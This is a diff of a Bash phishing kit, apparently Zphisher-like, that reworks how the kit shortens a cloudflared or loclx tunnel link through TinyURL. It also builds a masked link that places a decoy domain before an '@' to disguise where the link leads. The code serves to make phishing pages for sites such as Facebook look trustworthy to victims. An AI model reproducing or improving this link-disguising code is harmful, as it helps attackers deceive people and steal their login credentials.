@@ -504,46 +504,53 @@ custom_mask() {
 }
 
 ## URL Shortner
-site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
-
 shorten() {
-	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	if [[ "$1" == *"shrtco.de"* ]]; then
-		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	# TinyURL is simple - just returns the shortened URL directly
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1")
+	if [[ ! -z "$short" && "$short" == *"tinyurl.com"* ]]; then
+		processed_url="$short"
+		return 0
 	else
-		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
-		processed_url=${short#http*//}
+		return 1
 	fi
 }
 
 custom_url() {
 	url=${1#http*//}
-	isgd="https://is.gd/create.php?format=simple&url="
-	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
+	
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
-		fi
-
+		# Primary URL (direct cloudflared/loclx link)
 		url="https://$url"
-		masked_url="$mask@$processed_url"
-		processed_url="https://$processed_url"
+		
+		# Try to shorten with TinyURL
+		if shorten "$tinyurl$url"; then
+			# Successfully shortened
+			masked_url="$mask@${processed_url#http*//}"
+		else
+			# TinyURL failed, no shortened URL available
+			processed_url="Shortener unavailable"
+			masked_url=""
+		fi
 	else
-		# echo "[!] No url provided / Regex Not Matched"
+		# Invalid URL pattern
 		url="Unable to generate links. Try after turning on hotspot"
 		processed_url="Unable to Short URL"
+		masked_url=""
 	fi
 
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	# Display URLs
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 (Direct Cloudflared): ${GREEN}$url"
+	
+	if [[ $processed_url != *"Unable"* && $processed_url != *"unavailable"* ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 (TinyURL): ${ORANGE}$processed_url"
+	fi
+	
+	if [[ ! -z "$masked_url" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 (Masked): ${ORANGE}$masked_url"
+	fi
 }
 
 ## Facebook
